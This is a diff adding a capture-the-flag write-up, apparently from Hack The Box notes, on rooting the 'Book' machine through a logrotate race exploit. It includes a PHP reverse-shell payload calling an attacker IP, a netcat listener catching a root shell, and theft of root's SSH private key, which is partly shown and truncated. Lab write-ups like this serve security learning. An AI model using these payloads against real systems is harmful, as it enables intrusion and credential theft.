@@ -378,6 +378,67 @@ root.txt: not found
 # cat root.txt
 2f907ed450b361b2c2bf4e8795d5b561
 ```
+
+### Exploiting logrotate with access logs - hack the box book
+
+After running pspy we realise that logrotate is running as root.
+
+After some reasearching we find a github that has an explpoit [exploit](https://github.com/whotwagner/logrotten).
+
+Exploitation steps:
+
+```bash
+reader@book:~$ cd /tmp
+reader@book:/tmp$ mkdir shell
+reader@book:/tmp$ cd  shell
+reader@book:/tmp/shell$ nano logrotten.c
+reader@book:/tmp/shell$ gcc -o logrotten logrotten.c
+
+reader@book:/tmp/shell$ nano payload
+reader@book:/tmp/shell$ ./logrotten -p ./payload /home/reader/backups/access.log
+Waiting for rotating /home/reader/backups/access.log...
+```
+payload file:
+```php
+php -r '$sock=fsockopen("10.10.xx.xx",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+we have to echo data to the logs file to make it rotate otherwise it wont do anything
+```bash
+reader@book:~/backups$ cat access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+reader@book:~/backups$ echo "hi" > access.log
+```
+
+Note that it took a few attempts.
+
+Then we get a connection back on our shell:
+```bash
+kali@kali:~/boxes/book$ nc -nlvp 1234
+listening on [any] 1234 ...
+
+connect to [10.10.xx.xx] from (UNKNOWN) [10.10.10.176] 47712
+#  cat /root/.ssh/id_rsa
+-----BEGIN RSA PRIVATE KEY-----
+MIIEpAIBAAKCAQEAsxp94IilXDxbAhMRD2PsQQ46mGrvgSPUh26lCE.........
+```
+
+Then we can ssh as root and read the root flag.
+
+```bash
+kali@kali:~/boxes/book$ ssh -i root_rsa root@book.htb
+
+
+root@book:~# cat /root/root.txt
+84da92adf{...}
+```
+
 ### using jjs to priv esc - hack the box mango
 
 When we get a shell on the box we run `linenum.sh` to check for anything interesting.
